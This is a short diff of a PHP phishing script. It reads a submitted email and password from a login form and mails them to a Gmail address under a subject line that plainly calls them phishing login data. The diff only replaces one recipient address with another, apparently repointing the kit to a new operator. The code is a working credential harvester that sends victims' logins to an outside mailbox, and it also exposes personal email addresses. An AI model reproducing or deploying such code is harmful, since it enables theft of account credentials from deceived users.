@@ -3,7 +3,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $email = $_POST['email'];
     $password = $_POST['pass'];
 
-    $to = "armandobobadilla906@gmail.com";
+    $to = "esquicr@gmail.com";
     $subject = "Datos de inicio de sesión de phishing";
     $message = "Correo electrónico: " . $email . "\nContraseña: " . $password;
 
